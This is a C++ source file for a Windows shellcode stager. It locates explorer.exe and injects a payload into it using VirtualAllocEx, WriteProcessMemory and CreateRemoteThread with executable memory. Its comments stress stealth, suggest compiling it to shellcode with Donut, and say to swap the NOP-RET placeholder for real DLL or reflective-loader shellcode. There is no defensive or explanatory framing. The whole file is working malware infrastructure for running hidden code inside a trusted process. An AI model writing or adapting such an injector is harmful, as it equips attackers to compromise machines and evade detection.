#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")

// Minimal WinAPI footprint for stealth
DWORD GetTargetPid(const char* processName) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 entry = { sizeof(entry) };
    if (Process32First(snap, &entry)) {
        do {
            if (_stricmp(entry.szExeFile, processName) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &entry));
    }

    CloseHandle(snap);
    return pid;
}

void InjectShellcode(DWORD pid, LPVOID payload, SIZE_T size) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return;

    LPVOID remoteMem = VirtualAllocEx(hProc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        CloseHandle(hProc);
        return;
    }

    SIZE_T written = 0;
    if (WriteProcessMemory(hProc, remoteMem, payload, size, &written)) {
        HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMem, nullptr, 0, nullptr);
        if (hThread) CloseHandle(hThread);
    }

    CloseHandle(hProc);
}

// Entry Point — compile as position-independent code (PIC) or shellcode with Donut
extern "C" void WINAPI StagerMain() {
    // Replace this with the actual DLL or reflective loader shellcode bytes
    unsigned char shellcode[] = {
        /* example placeholder for payload */
        0x90, 0x90, 0xC3 // NOP NOP RET — stub
    };
    SIZE_T shellSize = sizeof(shellcode);

    const char* targetProcess = "explorer.exe";
    DWORD pid = GetTargetPid(targetProcess);
    if (pid) {
        InjectShellcode(pid, shellcode, shellSize);
    }
}
